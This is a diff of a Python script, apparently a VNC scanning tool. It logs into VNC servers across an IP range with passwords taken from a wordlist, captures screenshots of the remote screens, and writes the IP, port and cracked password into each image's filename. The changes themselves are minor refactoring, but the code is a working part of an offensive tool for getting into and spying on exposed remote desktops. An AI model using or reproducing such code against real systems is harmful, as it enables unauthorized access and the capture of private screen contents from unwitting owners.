@@ -107,11 +107,11 @@ def screencapture(startendpts):
                 if password_success:
                     print("IP " + str(i + 1) + "/" + str(end) + " (" + vncserver + ") has passed because it has a password present in your password list: " + correctpass)
                     try:
+                        screenshot_filename = str(i+1) + "_" + vncserver + "_" + vncport + "_" + correctpass + "_" + timestr + ".png"
                         client = api.connect(vncserver, password=correctpass)
                         client.timeout = screenshot_timeout
-                        screenshot_filename = str(i+1) + "_" + vncserver + "_" + vncport + "_" + correctpass + "_" + timestr + ".png"
                         client.captureScreen(screenshot_path + screenshot_filename)
-                        client.disconnect()            
+                        client.disconnect()  
                     except Exception as e:
                         print("IP " + str(i + 1) + "/" + str(end) + " (" + vncserver + ") password was found, but screenshot could not be taken. Exception: " + str(e))
                     else:
@@ -147,10 +147,8 @@ def screencapture(startendpts):
     
         
 def appendlinetofile(file, line):
-    print("Writing " + line + " to " + file)
     with open(file, "a") as myfile:
-        myfile.write(line + "\n") 
-    print("Finished writing " + line + " to " + file)
+        myfile.write(line + "\n")
         
         
 def readipfile():
